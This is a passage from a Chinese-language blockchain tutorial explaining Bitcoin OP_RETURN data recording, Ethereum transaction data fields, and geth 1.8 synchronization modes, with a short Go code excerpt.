<p>因此，区块链可以成为整个社会信用体系得以构建的底层基础设施。</p><h4><a name='header-n1298' class='md-header-anchor '></a>比特币数据记录</h4><blockquote><p>落地应用：<a href='https://www.docproof.org/'>docproof </a></p></blockquote><p>比特币的去中心特点和时间戳账本机制，即区块链技术，其潜在运用将大大超越支付领域。许多开发者试图充分发挥交易脚本语言的安全性和可恢复性优势，将其运用于电子公证服务、证券认证和智能合约等领域。很多早期的开发者利用比特币这种能将交易数据放到区块链上的技术进行了很多尝试，例如，为文件记录电子指纹，则任何人都可以通过该机制在特定的日期建立关于文档存在性的证明。</p><p>运用比特币的区块链技术存储与比特币支付不相关数据的做法是一个有争议的话题。许多开发者认为其有滥用的嫌疑，因而试图予以阻止。另一些开发者则将之视为区块链技术强大功能的有力证明，从而试图给予大力支持。那些反对非支付相关应用的开发者认为这样做将引致“区块链膨胀”，因为所有的区块链节点都将以消耗磁盘存储空间为成本，负担存储此类 数据的任务。</p><p>更为严重的是，此类交易仅将比特币地址当作自由组合的 20个字节而使用，进而会产生不能用于交易的UTXO。因为比特币地址只是被当作数据使用，并不与私钥相匹配，所以会导致 UTXO 不能被用于交易，因而是一种伪支付行为。因此，这些交易永远不会被花费，所以永远不会从 UTXO 集中删除，并导致 UTXO 数据库的大小永远增加或“膨胀”。</p><p>在 0.9 版的比特币核心客户端上，通过采用 RETURN 操作符最终实现了妥协。RETURN 允许开发者在交易输出上增加 80 字节的非交易数据。然后，与伪交易型的 UTXO 不同，Return 创造了一种明确的可复查的非交易型输出，此类数据无需存储于 UTXO 集。RETURN 输出被记录在区块链上，它们会消耗磁盘空间，也会导致区块链规模的增加，但 它们不存储在 UTXO 集中，因此也不会使得 UTXO 内存膨胀，更不会以消耗代价高昂的内存为代价使全节点都不堪重负。 RETURN 脚本的样式：</p><pre spellcheck="false" class="md-fences mock-cm md-end-block" lang="" contenteditable="false" cid="n1310" mdtype="fences">  RETURN &lt;data&gt;
</pre><p>“data”部分被限制为 80 字节，且多以哈希方式呈现，如 32 字节的 SHA256 算法输出。许多应用都在其前面加上前缀以辅助认定。例如，电子公正服务的证明材料采用 8 个字节的前缀“DOCPROOF”，在十六进制算法中，相应的 ASCII 码为 44 4f 43 50 52 4f 4f 46。</p><p>请记住 RETURN 不涉及可用于支付的解锁脚本的特点， RETURN 不能使用其输出中所锁定的资金，因此它也就没有必要记录在蕴含潜在成本的 UTXO 集中，所以 RETURN 实际是没有成本的。</p><p>RETURN 常为一个金额为 0 的比特币输出， 因为任何与该输出相对应的比特币都会永久消失。假如一笔 RETURN 被作为一笔交易的输入，脚本验证引擎将会阻止验证脚本的执行，将标记交易为无效。如果你碰巧将 RETURN 的输出作为另一笔交易的输入，则该交易是无效的。</p><p><strong>举例</strong></p><blockquote><p><a href='https://www.blockchain.com/btc/tx/b17a027a8f7ae0db4ddbaa58927d0f254e97fce63b7e57e8e50957d3dad2e66e'>交易 0xb17a027a8f7ae0db4ddbaa58927d0f254e97fce63b7e57e8e50957d3dad2e66e</a></p><p><a href='https://www.blockchain.com/btc/tx/e89e09ac184e1a175ce748775b3e63686cb1e5fe948365236aac3b3aef3fedd0'>交易 0xe89e09ac184e1a175ce748775b3e63686cb1e5fe948365236aac3b3aef3fedd0</a></p></blockquote><p>如下，两个交易输出脚本只包含数据（十六进制），解码分别对应</p><p> <code>Yuki will you marry me ? Tetsu.</code></p><p> <code>Yes I will. Yuki.</code></p><p><img src='pic/blockchain/op_return1.png' alt='' referrerPolicy='no-referrer' /></p><p><img src='pic/blockchain/op_return2.png' alt='' referrerPolicy='no-referrer' /></p><h4><a name='header-n1334' class='md-header-anchor '></a>以太坊数据记录</h4><p>以太坊在交易中数据字段中添加待记录的数据，<a href='https://etherscan.io/tx/0xb1ed364e4333aae1da4a901d5231244ba6a35f9421d4607f7cb90d60bf45578a'>如下所示</a></p><p><img src='pic/blockchain/eth_record.png' alt='' referrerPolicy='no-referrer' /></p><h2><a name='header-n1339' class='md-header-anchor '></a>以太坊 geth 源码</h2><blockquote><p><strong>源码版本：</strong>基于 release 1.8 分支</p></blockquote><h3><a name='header-n1343' class='md-header-anchor '></a>同步模式</h3><h4><a name='header-n1344' class='md-header-anchor '></a>同步模式的定义</h4><p>在文件 eth/downloader/modes.go 定义了同步模式，主要包含如下三种同步模式 full/fast/light，详见定义</p><p><img src='pic/blockchain/eth_sync_mode.png' alt='' referrerPolicy='no-referrer' /></p><p>SyncMode 类型定义 <code>type SyncMode int</code>，实际数据类型为 <code>int</code>，三种同步模式的差异如下：</p><figure><table><thead><tr><th>同步模式</th><th>特点</th><th>备注</th></tr></thead><tbody><tr><td>FullSync</td><td>同步完整的区块信息</td><td>全量同步</td></tr><tr><td>FastSync</td><td>快速同步 header（至最新高度 X），然后同步（最新高度 X 之后的）完整的<br />区块信息</td><td>快速同步</td></tr><tr><td>LightSync</td><td>只同步 header，同步完成之后终止</td><td>轻量同步</td></tr></tbody></table></figure><h4><a name='header-n1368' class='md-header-anchor '></a>默认同步模式</h4><p>在 cmd/utils/flags.go 文件内定义了项目启动时的基本配置参数</p><p><img src='pic/blockchain/eth_default_sync_mode.png' alt='' referrerPolicy='no-referrer' /></p><p>然后，查看 eth.DefaulConfig 结构中关于 SyncMode 的定义，如下所示</p><p><img src='pic/blockchain/eth_default_sync_mode2.png' alt='' referrerPolicy='no-referrer' /></p><p>因此，默认的同步模式为 FastSync，即，快速同步。</p><h4><a name='header-n1379' class='md-header-anchor '></a>同步模式的自动切换</h4><p>然后，根据实际同步情况，可能调整同步模式，在 eth/handler.go 中方法 NewProtocolManager 有如下代码逻辑</p><p><img src='pic/blockchain/adjust_sync_mode.png' alt='' referrerPolicy='no-referrer' /></p><p><strong>解读：</strong>即使启动节点使用默认同步模式或者通过指定 FastSync 快速同步模式，节点启动时，检查当前区块高度，如果已经同步高一部分数据时，此高度大于 0，程序自动将同步模式切换成 FullSync 全量同步模式，并打印警告信息，如下所示</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="go"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">// Figure out whether to allow fast sync or not</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> <span class="cm-variable">mode</span> <span class="cm-operator">==</span> <span class="cm-variable">downloader</span><span class="cm-number">.</span><span class="cm-variable">FastSync</span> <span class="cm-operator">&amp;&amp;</span> <span class="cm-variable">blockchain</span><span class="cm-number">.</span><span class="cm-variable">CurrentBlock</span>()<span class="cm-number">.</span><span class="cm-variable">NumberU64</span>() <span class="cm-operator">&gt;</span> <span class="cm-number">0</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">log</span><span class="cm-number">.</span><span class="cm-variable">Warn</span>(<span class="cm-string">"Blockchain not empty, fast sync disabled"</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">mode</span> <span class="cm-operator">=</span> <span class="cm-variable">downloader</span><span class="cm-number">.</span><span class="cm-variable">FullSync</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 125px;"></div><div class="CodeMirror-gutters" style="display: none; height: 125px;"></div></div></div></pre><h4><a name='header-n1387' class='md-header-anchor '></a>总结</h4><ul><li>同步模式共有三种：全量、快速、轻量，默认采用快速同步模式</li><li>同步模式可能发生自动切换</li><li>同步区块数据量的多少与使用同步模式 FullSync 的时机、同步节点启停次数有一定关系</li></ul></div>
</body>
</html>